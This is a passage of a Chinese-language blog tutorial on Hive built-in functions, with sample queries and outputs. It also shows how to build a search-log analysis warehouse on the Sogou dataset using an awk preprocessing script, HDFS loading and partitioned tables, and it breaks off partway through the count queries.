统计等。内置函数可以被分成：数学函数、字符函数、收集函数、转换函数、日期函数、条件函数、聚合函数以及表生成函数。</p><h3 id="数学函数"><a class="markdownIt-Anchor" href="#数学函数">#</a> 数学函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#加法</span><br><span class="line"><span class="keyword">select</span> <span class="number">10</span><span class="operator">+</span><span class="number">10</span>;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">20</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">1.324</span> seconds)</span><br><span class="line"></span><br><span class="line">#减法</span><br><span class="line"><span class="keyword">select</span> <span class="number">15</span><span class="number">-3</span>;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.564</span> seconds)</span><br><span class="line"></span><br><span class="line">#乘除<span class="operator">*</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">6</span><span class="operator">*</span><span class="number">6</span>;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">36</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.867</span> seconds)</span><br><span class="line"><span class="keyword">select</span> <span class="number">36</span><span class="operator">/</span><span class="number">6</span>;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6.0</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.734</span> seconds)</span><br><span class="line"></span><br><span class="line">#round四舍五入</span><br><span class="line"><span class="keyword">select</span> round(<span class="number">88.999</span>,<span class="number">2</span>),round(<span class="number">78.600</span>,<span class="number">1</span>), round(<span class="number">55.776</span>,<span class="number">2</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">89.00</span>  <span class="operator">|</span> <span class="number">78.6</span>  <span class="operator">|</span> <span class="number">55.78</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.505</span> seconds)</span><br><span class="line"></span><br><span class="line">#ceil向上取整</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">ceil</span>(<span class="number">84.5</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">85</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.542</span> seconds)</span><br><span class="line"></span><br><span class="line">#floor向下取整</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">45.9</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">45</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.535</span> seconds)</span><br><span class="line"></span><br><span class="line">#pow 平方函数</span><br><span class="line"><span class="keyword">select</span> pow(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.0</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.357</span> seconds)</span><br><span class="line"></span><br><span class="line">#pmod 取模函数</span><br><span class="line"><span class="keyword">select</span> pmod(<span class="number">9</span>,<span class="number">8</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.242</span> seconds)</span><br></pre></td></tr></table></figure><h3 id="字符函数"><a class="markdownIt-Anchor" href="#字符函数">#</a> 字符函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#lower转小写</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">lower</span>(&quot;FJKNXCYT&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> fjknxcyt  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line">#upper转大写</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">upper</span>(&quot;asdjnkgbasd&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"><span class="operator">|</span> ASDJNKGBASD  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line">#length字符串长度</span><br><span class="line"><span class="keyword">select</span> length(&quot;hadoop&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line">#concat字符拼接</span><br><span class="line"><span class="keyword">select</span> concat(&quot;hadoop&quot;, &quot;&amp;hive&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"><span class="operator">|</span> hadoop<span class="operator">&amp;</span>hive  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line">#substr取子串(从<span class="number">8</span>开始取<span class="number">5</span>个)</span><br><span class="line"><span class="keyword">select</span> substr(&quot;hadoop spark hive&quot;, <span class="number">8</span>, <span class="number">5</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> spark  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line">#trim去除前后空格</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">trim</span>(&quot;   hadoop   &quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> hadoop  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br></pre></td></tr></table></figure><h3 id="转换函数"><a class="markdownIt-Anchor" href="#转换函数">#</a> 转换函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#cast类型转换函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">cast</span> (<span class="number">88</span> <span class="keyword">as</span> <span class="keyword">double</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">88.0</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br></pre></td></tr></table></figure><h3 id="日期函数"><a class="markdownIt-Anchor" href="#日期函数">#</a> 日期函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">year</span> <span class="keyword">month</span> <span class="keyword">day</span> 分别获取年月日</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">year</span>(&quot;2021-10-08 18:40:24&quot;), <span class="keyword">month</span>(&quot;2021-10-08 18:40:24&quot;), <span class="keyword">day</span>(&quot;2021-10-08 18:40:24&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2021</span>  <span class="operator">|</span> <span class="number">10</span>   <span class="operator">|</span> <span class="number">8</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+------+</span></span><br><span class="line">#to_date返回字段中日期部分</span><br><span class="line"><span class="keyword">select</span> to_date(&quot;2021-10-08 18:40:24&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2021</span><span class="number">-10</span><span class="number">-08</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br></pre></td></tr></table></figure><h3 id="条件函数"><a class="markdownIt-Anchor" href="#条件函数">#</a> 条件函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">case</span> A <span class="keyword">when</span> B <span class="keyword">then</span> C <span class="keyword">when</span> D <span class="keyword">then</span> E <span class="keyword">else</span> F <span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">select</span> ts, uid, rank, <span class="keyword">case</span> rank <span class="keyword">when</span> &quot;2&quot; <span class="keyword">then</span> rank<span class="operator">+</span><span class="number">1</span> <span class="keyword">else</span> rank<span class="number">-1</span> <span class="keyword">end</span> <span class="keyword">from</span> sogou.sogou_liangjian;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------------------------+-------+------+</span></span><br><span class="line"><span class="operator">|</span>       ts        <span class="operator">|</span>                uid                <span class="operator">|</span> rank  <span class="operator">|</span> _c3  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------------------------+-------+------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">20111230104333</span>  <span class="operator">|</span> <span class="number">53</span>a3b5132bd6af7d324f3fd55d7153ba  <span class="operator">|</span> <span class="number">3</span>     <span class="operator">|</span> <span class="number">2</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">20111230104334</span>  <span class="operator">|</span> <span class="number">966</span>a6bf4c4ec1cc693b6e40702984235  <span class="operator">|</span> <span class="number">4</span>     <span class="operator">|</span> <span class="number">3</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">20111230104334</span>  <span class="operator">|</span> ae55d5e4b4f29a1221816a121e087567  <span class="operator">|</span> <span class="number">2</span>     <span class="operator">|</span> <span class="number">3</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------------------------+-------+------+</span></span><br></pre></td></tr></table></figure><h3 id="聚合函数"><a class="markdownIt-Anchor" href="#聚合函数">#</a> 聚合函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#count返回行数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1330</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line">#sum求和</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(orders) <span class="keyword">as</span> ordersum <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> ordersum  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2043</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line">#min列最小值</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(orders) <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line">#max列最大值</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(rank) <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line">#avg列平均值</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(rank) <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2.9225563909774435</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br></pre></td></tr></table></figure><h2 id="hive-构建搜索日志分析系统"><a class="markdownIt-Anchor" href="#hive-构建搜索日志分析系统">#</a> Hive 构建搜索日志分析系统</h2><h3 id="数据预处理linux环境"><a class="markdownIt-Anchor" href="#数据预处理linux环境">#</a> 数据预处理 (Linux 环境)</h3><ol><li>查看数据</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 hive]# wc -l sogou.500w.utf8 </span><br><span class="line">5000000 sogou.500w.utf8</span><br></pre></td></tr></table></figure><ol start="2"><li>数据拓展<br>将用户访问的时间拆分成，年月日小时字段，为后面创建分区表做准备，编写一个 shell 脚本实现此功能。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vi pre.sh </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">infile=$1</span><br><span class="line">outfile=$2</span><br><span class="line">awk -F &#x27;\t&#x27; &#x27;&#123;print $0&quot;\t&quot;substr($1,1,4)&quot;\t&quot;substr($1,5,2)&quot;\t&quot;substr($1,7,2)&quot;\t&quot;substr($1,9,2)&#125;&#x27; $infile &gt; $outfile</span><br><span class="line"></span><br><span class="line">chmod +x pre.sh</span><br><span class="line">sh pre.sh ./sogou.500w.utf8 ./sogou.500w.utf8.ext</span><br><span class="line">less sogou.500w.utf8.ext</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>数据加载<br>将数据放到 HDFS 上</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hdfs dfs -mkdir -p /usr/local/hive/</span><br><span class="line">hdfs dfs -put ./sogou.500w.utf8.ext /usr/local/hive/</span><br></pre></td></tr></table></figure><h3 id="基于hive-构建日志的数据仓库"><a class="markdownIt-Anchor" href="#基于hive-构建日志的数据仓库">#</a> 基于 Hive 构建日志的数据仓库</h3><p>启动 Hadoop 集群，打开 Hive 客户端</p><ol><li>基本操作</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span>    database_name    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">default</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sys                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> sogou;</span><br><span class="line">use sogou;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>     tab_name     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> sogou_500w       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_liangjian  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_xj         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_xj_backup  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line">#创建外部表sogou_0936加载sogou<span class="number">.500</span>w.utf8的数据</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span>  if <span class="keyword">not</span> <span class="keyword">exists</span> sogou.sogou_0936(ts string,uid string,keyword string, rank <span class="type">int</span>, orders <span class="type">int</span>, url string) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span> stored <span class="keyword">as</span> textfile location <span class="string">&#x27;/usr/local/hive/raw/&#x27;</span>;</span><br><span class="line">#创建外部表sogou_ext加载sogou<span class="number">.500</span>w.utf8.ext的数据</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span>  if <span class="keyword">not</span> <span class="keyword">exists</span> sogou.sogou_ext(ts string,uid string,keyword string, rank <span class="type">int</span>, orders <span class="type">int</span>, url string) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span> stored <span class="keyword">as</span> textfile location <span class="string">&#x27;/usr/local/hive/ext/&#x27;</span></span><br><span class="line">#查看数据没问题</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou_0936 limit <span class="number">10</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou_ext limit <span class="number">10</span>;</span><br><span class="line"><span class="keyword">desc</span> sogou_0936;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> col_name  <span class="operator">|</span> data_type  <span class="operator">|</span> comment  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> ts        <span class="operator">|</span> string     <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> uid       <span class="operator">|</span> string     <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> keyword   <span class="operator">|</span> string     <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> rank      <span class="operator">|</span> <span class="type">int</span>        <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> orders    <span class="operator">|</span> <span class="type">int</span>        <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> url       <span class="operator">|</span> string     <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+----------+</span></span><br></pre></td></tr></table></figure><ol start="2"><li>创建分区表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#创建分区表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span>  if <span class="keyword">not</span> <span class="keyword">exists</span> sogou.sogou_partition(ts string,uid string,keyword string, rank <span class="type">int</span>, orders <span class="type">int</span>, url string) partitioned <span class="keyword">by</span> (<span class="keyword">year</span> <span class="type">int</span>, <span class="keyword">month</span> <span class="type">int</span>, <span class="keyword">day</span> <span class="type">int</span>, <span class="keyword">hour</span> <span class="type">int</span> ) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span> stored <span class="keyword">as</span> textfile;</span><br><span class="line">#查看表</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>     tab_name     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> sogou_0936       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_500w       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_ext        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_liangjian  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_partition  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_xj         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_xj_backup  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line">#最后向分区表中导入数据</span><br><span class="line">#开启动态分区非严格模式</span><br><span class="line"><span class="keyword">set</span> hive.exec.dynamic.partition.mode<span class="operator">=</span>nonstrict;</span><br><span class="line">#禁用矢量运行</span><br><span class="line"><span class="keyword">set</span> hive.vectorized.execution.enabled<span class="operator">=</span><span class="literal">false</span>;</span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">table</span> sogou.sogou_partition <span class="keyword">partition</span>(<span class="keyword">year</span>, <span class="keyword">month</span>, <span class="keyword">day</span>, <span class="keyword">hour</span>) <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou.sogou_ext;</span><br><span class="line">#查看数据</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211008220145786.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211008220145786"></p><p><img "" class="lazyload placeholder" data-original="image-20211008220222053.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211008220222053"></p><p><img "" class="lazyload placeholder" data-original="image-20211008220457507.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211008220457507"></p><h3 id="数据分析需求1条数统计"><a class="markdownIt-Anchor" href="#数据分析需求1条数统计">#</a> 数据分析需求（1）：条数统计</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询总数据条数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211008221558788.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211008221558788"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询关键词非空数据</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> keyword <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">and</span> keyword <span class="operator">!=</span> <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009083441029.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009083441029"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#无重复总条数（根据ts, uid, keyword, url）</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> ts,uid,keyword,url <span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">=</span> <span class="number">1</span> ) t;</span><br><span class="line">#需要给子表起个名</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009114925786.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009114925786"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 